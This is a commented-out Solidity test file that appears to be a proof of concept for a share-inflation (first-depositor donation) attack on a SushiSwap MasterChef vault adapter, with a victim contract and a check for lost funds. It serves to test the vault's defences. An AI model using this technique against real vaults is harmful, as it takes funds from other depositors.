// // SPDX-License-Identifier: AGPL-3.0-only
// pragma solidity >=0.8.0;

// import "../adapters/masterchef/MasterChefAdapter.sol";

// contract Victim {
//     address public daieth_slp;
//     address public adapter;

//     constructor(address _daieth_slp, address _adapter) {
//         daieth_slp = _daieth_slp;
//         adapter = _adapter;

//         ERC20(daieth_slp).approve(adapter, type(uint256).max);
//     }

//     function deposit(uint256 amount) external {
//         MasterChefAdapter(adapter).deposit(amount, address(this));
//     }

//     function withdraw() external {
//         MasterChefAdapter(adapter).redeem(
//             MasterChefAdapter(adapter).balanceOf(address(this)),
//             address(this),
//             address(this)
//         );
//     }
// }

// contract ExpMasterChef {

//     address constant masterChef = 0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd;
//     address constant daieth_slp = 0xC3D03e4F041Fd4cD388c549Ee2A29a9E5075882f;
//     address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
//     address constant dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
//     address constant sushiswap = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
//     address constant sushi = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;

//     uint256 constant masterChefpool = 2;

//     uint256 constant victimFund = 99 ether;

//     MasterChefAdapter public adapter;
//     Victim public victim;

//     function setUp() external {
//         // check we have enough lpToken
//         require(ERC20(daieth_slp).balanceOf(address(this)) >= 200 ether);

//         address[] memory _rewardTokenToLp0Route = new address[](2);
//         _rewardTokenToLp0Route[0] = sushi;
//         _rewardTokenToLp0Route[1] = weth;

//         address[] memory _rewardTokenToLp1Route = new address[](3);
//         _rewardTokenToLp1Route[0] = sushi;
//         _rewardTokenToLp1Route[1] = weth;
//         _rewardTokenToLp1Route[2] = dai;

//         adapter = new MasterChefAdapter(
//             ERC20(daieth_slp),
//             masterChefpool,
//             _rewardTokenToLp0Route,
//             _rewardTokenToLp1Route,
//             sushiswap,
//             masterChef,
//             sushi
//         );

//         // approve adapter
//         ERC20(daieth_slp).approve(address(adapter), type(uint256).max);

//         // create a victim and send some lpToken to him
//         victim = new Victim(daieth_slp, address(adapter));
//         ERC20(daieth_slp).transfer(address(victim), victimFund);
//         require(ERC20(daieth_slp).balanceOf(address(victim)) == victimFund);
//     }

//     function run() external {
//         // step (1). deposit 1 wei daieth_slp
//         adapter.deposit(1, address(this)); // 1 share

//         // step (2). send 100 ethers - 2 wei daieth_slp to adapter, and deposit 1 more wei daieth_slp
//         ERC20(daieth_slp).transfer(address(adapter), 100 ether - 2 wei);
//         adapter.deposit(1, address(this));

//         check();
//     }

//     function check() public {
//         // we check that whether the victim user can take back his fund (> 99%)
//         victim.deposit(victimFund);
//         victim.withdraw();

//         ERC20 lpToken = ERC20(daieth_slp);
//         require(
//             lpToken.balanceOf(address(victim)) > victimFund * 99 / 100,
//             "victim user funds lost!"
//         );
//     }
// }